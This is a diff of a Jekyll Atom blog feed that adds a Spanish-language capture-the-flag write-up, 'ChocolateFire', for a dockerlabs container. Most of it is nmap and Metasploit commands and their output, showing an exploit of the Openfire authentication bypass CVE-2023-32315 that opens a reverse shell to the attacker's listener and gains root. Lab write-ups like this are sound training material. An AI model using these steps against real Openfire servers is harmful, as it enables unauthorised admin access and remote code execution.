@@ -1,4 +1,275 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-06-25T23:18:24+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">Espeto malagueño</title><link href="/posts/espeto/" rel="alternate" type="text/html" title="Espeto malagueño" /><published>2024-06-23T00:00:00+00:00</published><updated>2024-06-23T00:00:00+00:00</updated><id>/posts/espeto</id><content type="html" xml:base="/posts/espeto/"><![CDATA[<p>Estamos ante una máquina Windows de nivel principiante creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-06-25T23:24:09+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">ChocolateFire</title><link href="/posts/chocolatefire/" rel="alternate" type="text/html" title="ChocolateFire" /><published>2024-06-25T00:00:00+00:00</published><updated>2024-06-25T00:00:00+00:00</updated><id>/posts/chocolatefire</id><content type="html" xml:base="/posts/chocolatefire/"><![CDATA[<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>
+
+<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5222/tcp open  xmpp-client
+5223/tcp open  hpvirtgrp
+5262/tcp open  unknown
+5263/tcp open  unknown
+5269/tcp open  xmpp-server
+5270/tcp open  xmp
+5275/tcp open  unknown
+5276/tcp open  unknown
+7070/tcp open  realserver
+7777/tcp open  cbt
+9090/tcp open  zeus-admin
+MAC Address: 02:42:AC:11:00:02 <span class="o">(</span>Unknown<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Vemos que tiene bastantes puertos abiertos. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,5222,5223,5262,5263,5269,5270,5275,5276,7079,7777,9090 <span class="nt">-v</span> 172.17.0.2
+PORT     STATE  SERVICE        VERSION
+22/tcp   open   ssh            OpenSSH 8.4p1 Debian 5+deb11u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 9c:7c:e5:ea:fe:ac:f5:bc:21:54:87:66:70:ed:df:75 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 b2:1a:b1:05:0e:7e:94:18:98:19:8f:60:d7:04:7a:1c <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 c1:81:ba:4f:1a:99:9f:32:10:4a:6a:d9:f4:aa:40:de <span class="o">(</span>ED25519<span class="o">)</span>
+5222/tcp open   jabber         Ignite Realtime Openfire Jabber server 3.10.0 or later
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     xmpp: 
+|       version: 1.0
+|     errors: 
+|       invalid-namespace
+|       <span class="o">(</span><span class="nb">timeout</span><span class="o">)</span>
+|     auth_mechanisms: 
+|     stream_id: 99oqy71pmn
+|     compression_methods: 
+|     unknown: 
+|     capabilities: 
+|_    features: 
+|_ssl-cert: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+5223/tcp open   ssl/hpvirtgrp?
+|_ssl-date: TLS randomness does not represent <span class="nb">time
+</span>5262/tcp open   jabber         Ignite Realtime Openfire Jabber server 3.10.0 or later
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     xmpp: 
+|       version: 1.0
+|     errors: 
+|       invalid-namespace
+|       <span class="o">(</span><span class="nb">timeout</span><span class="o">)</span>
+|     auth_mechanisms: 
+|     stream_id: 2qbrswme5i
+|     compression_methods: 
+|     unknown: 
+|     capabilities: 
+|_    features: 
+5263/tcp open   ssl/unknown
+|_ssl-date: TLS randomness does not represent <span class="nb">time
+</span>5269/tcp open   xmpp           Wildfire XMPP Client
+| xmpp-info: 
+|   Respects server name
+|   STARTTLS Failed
+|   info: 
+|     xmpp: 
+|       version: 1.0
+|     errors: 
+|       host-unknown
+|       <span class="o">(</span><span class="nb">timeout</span><span class="o">)</span>
+|     auth_mechanisms: 
+|     stream_id: awy7elrapf
+|     compression_methods: 
+|     unknown: 
+|     capabilities: 
+|_    features: 
+5270/tcp open   xmp?
+5275/tcp open   jabber         Ignite Realtime Openfire Jabber server 3.10.0 or later
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     xmpp: 
+|       version: 1.0
+|     errors: 
+|       invalid-namespace
+|       <span class="o">(</span><span class="nb">timeout</span><span class="o">)</span>
+|     auth_mechanisms: 
+|     stream_id: 69e0bm6okz
+|     compression_methods: 
+|     unknown: 
+|     capabilities: 
+|_    features: 
+5276/tcp open   ssl/unknown
+|_ssl-date: TLS randomness does not represent <span class="nb">time
+</span>7079/tcp closed unknown
+7777/tcp open   socks5         <span class="o">(</span>No authentication<span class="p">;</span> connection failed<span class="o">)</span>
+| socks-auth-info: 
+|_  No authentication
+9090/tcp open   zeus-admin?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 25 Jun 2024 16:16:54 GMT
+|     Last-Modified: Wed, 16 Feb 2022 15:55:03 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 115
+|     &lt;html&gt;
+|     &lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;&lt;/title&gt;
+|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"refresh"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"0;URL=index.jsp"</span><span class="o">&gt;</span>
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 25 Jun 2024 16:16:59 GMT
+|     Allow: GET,HEAD,POST,OPTIONS
+|   JavaRMI, drda, ibm-db2-das, informix: 
+|     HTTP/1.1 400 Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x0
+|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x0&lt;/pre&gt;
+|   SqueezeCenter_CLI: 
+|     HTTP/1.1 400 No URI
+|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
+|     Content-Length: 49
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;
+|   WMSRequest: 
+|     HTTP/1.1 400 Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x1
+|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x1&lt;/pre&gt;
+</code></pre></div></div>
+
+<p>Lo único que llama la atención es el puerto <code class="language-plaintext highlighter-rouge">9090</code>, vemos que nos da una respuesta <code class="language-plaintext highlighter-rouge">HTTP1.1 200 OK</code>.  Entramos con el navegador a la url <code class="language-plaintext highlighter-rouge">http://172.17.0.2:9090</code>:</p>
+
+<p><img src="/assets/images/chocolatefire/1.jpg" alt="image" /></p>
+
+<p>Y nos encontramos un panel de login de <code class="language-plaintext highlighter-rouge">openfire 4.7.4</code>.</p>
+
+<p>Buscamos si existe alguna vulnerabilidad para esa versión.</p>
+
+<p>https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-32315</p>
+
+<p>En el artículo hace mención a un plugin de <code class="language-plaintext highlighter-rouge">metasploit</code>. Lo abrimos con <code class="language-plaintext highlighter-rouge">msfconsole</code> y buscamos el servicio que queremos explotar:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> search openfire
+
+Matching Modules
+<span class="o">================</span>
+
+   <span class="c">#  Name                                                        Disclosure Date  Rank       Check  Description</span>
+   -  <span class="nt">----</span>                                                        <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
+   0  exploit/multi/http/openfire_auth_bypass                     2008-11-10       excellent  Yes    Openfire Admin Console Authentication Bypass
+   1    <span class="se">\_</span> target: Java Universal                                 <span class="nb">.</span>                <span class="nb">.</span>          <span class="nb">.</span>      <span class="nb">.</span>
+   2    <span class="se">\_</span> target: Windows x86 <span class="o">(</span>Native Payload<span class="o">)</span>                   <span class="nb">.</span>                <span class="nb">.</span>          <span class="nb">.</span>      <span class="nb">.</span>
+   3    <span class="se">\_</span> target: Linux x86 <span class="o">(</span>Native Payload<span class="o">)</span>                     <span class="nb">.</span>                <span class="nb">.</span>          <span class="nb">.</span>      <span class="nb">.</span>
+   4  exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315  2023-05-26       excellent  Yes    Openfire authentication bypass with RCE plugin
+</code></pre></div></div>
+
+<p>Elegimos la opción 4, <code class="language-plaintext highlighter-rouge">use 4</code>, y vemos las opciones del plugin con <code class="language-plaintext highlighter-rouge">options</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use 4
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using configured payload java/shell/reverse_tcp
+msf6 exploit<span class="o">(</span>multi/http/openfire_auth_bypass_r
+ce_cve_2023_32315<span class="o">)</span> <span class="o">&gt;</span> options
+
+Module options <span class="o">(</span>exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315<span class="o">)</span>:
+
+   Name          Current Setti  Required  Description
+                 ng
+   <span class="nt">----</span>          <span class="nt">-------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   ADMINNAME                    no        Openfire admin user
+                                           name, <span class="o">(</span>default: ra
+                                          ndom<span class="o">)</span>
+   PLUGINAUTHOR                 no        Openfire plugin aut
+                                          hor, <span class="o">(</span>default: rand
+                                          om<span class="o">)</span>
+   PLUGINDESC                   no        Openfire plugin des
+                                          cription, <span class="o">(</span>default:
+                                           random<span class="o">)</span>
+   PLUGINNAME                   no        Openfire plugin bas
+                                          e name, <span class="o">(</span>default: r
+                                          andom<span class="o">)</span>
+   Proxies                      no        A proxy chain of fo
+                                          rmat <span class="nb">type</span>:host:port
+                                          <span class="o">[</span>,type:host:port][.
+                                          ..]
+   RHOSTS                       <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>,
+                                           see https://docs.m
+                                          etasploit.com/docs/
+                                          using-metasploit/ba
+                                          sics/using-metasplo
+                                          it.html
+   RPORT         9090           <span class="nb">yes       </span>The target port <span class="o">(</span>TC
+                                          P<span class="o">)</span>
+   SSL           <span class="nb">false          </span>no        Negotiate SSL/TLS f
+                                          or outgoing connect
+                                          ions
+   TARGETURI     /              <span class="nb">yes       </span>The base path to th
+                                          e web application
+   VHOST                        no        HTTP server virtual
+                                           host
+
+Payload options <span class="o">(</span>java/shell/reverse_tcp<span class="o">)</span>:
+
+   Name   Current Setting  Required  Description
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST                   <span class="nb">yes       </span>The listen address <span class="o">(</span>an i
+                                     nterface may be specifie
+                                     d<span class="o">)</span>
+   LPORT  4444             <span class="nb">yes       </span>The listen port
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Java Universal
+
+View the full module info with the info, or info <span class="nt">-d</span> command.
+
+</code></pre></div></div>
+
+<p>En este caso solo tenemos que modificar la ip del servidor con <code class="language-plaintext highlighter-rouge">set rhost 172.17.0.2</code> y nuestra ip para conseguir una shell reversa con <code class="language-plaintext highlighter-rouge">set lhost 172.17.0.1</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/http/openfire_auth_bypass_r
+ce_cve_2023_32315<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts 172.17.0.2
+rhosts <span class="o">=&gt;</span> 172.17.0.2
+msf6 exploit<span class="o">(</span>multi/http/openfire_auth_bypass_r
+ce_cve_2023_32315<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 172.17.0.1
+lhost <span class="o">=&gt;</span> 172.17.0.1
+
+</code></pre></div></div>
+
+<p>Ejecutamos el exploit con <code class="language-plaintext highlighter-rouge">run</code> y obtenemos la shell reversa como <strong>root</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/http/openfire_auth_bypass_r
+ce_cve_2023_32315<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 172.17.0.1:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Running automatic check <span class="o">(</span><span class="s2">"set AutoCheck false"</span> to disable<span class="o">)</span>
+<span class="o">[</span>+] The target appears to be vulnerable. Openfire version is 4.7.4
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Grabbing the cookies.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nv">JSESSIONID</span><span class="o">=</span>node0cth6fd268hoq15f35ozhcwbce178.node0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nv">csrf</span><span class="o">=</span>lIe3q07bz2wrINa
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Adding a new admin user.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Logging <span class="k">in </span>with admin user <span class="s2">"tcodhiugrmxzf"</span> and password <span class="s2">"2HvOx3pY"</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Upload and execute plugin <span class="s2">"aoxYPFC316nfr"</span> with payload <span class="s2">"java/shell/reverse_tcp"</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>2952 bytes<span class="o">)</span> to 172.17.0.2
+<span class="o">[!]</span> Plugin <span class="s2">"aoxYPFC316nfr"</span> need manually clean-up via Openfire Admin console.
+<span class="o">[!]</span> Admin user <span class="s2">"tcodhiugrmxzf"</span> need manually clean-up via Openfire Admin console.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>172.17.0.1:4444 -&gt; 172.17.0.2:53926<span class="o">)</span> at 2024-06-25 21:28:44 +0200
+
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nb">hostname
+</span>9566bdac1160
+
+</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="medio" /><summary type="html"><![CDATA[Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma dockerlabs.]]></summary></entry><entry><title type="html">Espeto malagueño</title><link href="/posts/espeto/" rel="alternate" type="text/html" title="Espeto malagueño" /><published>2024-06-23T00:00:00+00:00</published><updated>2024-06-23T00:00:00+00:00</updated><id>/posts/espeto</id><content type="html" xml:base="/posts/espeto/"><![CDATA[<p>Estamos ante una máquina Windows de nivel principiante creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
 
 <p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>
 
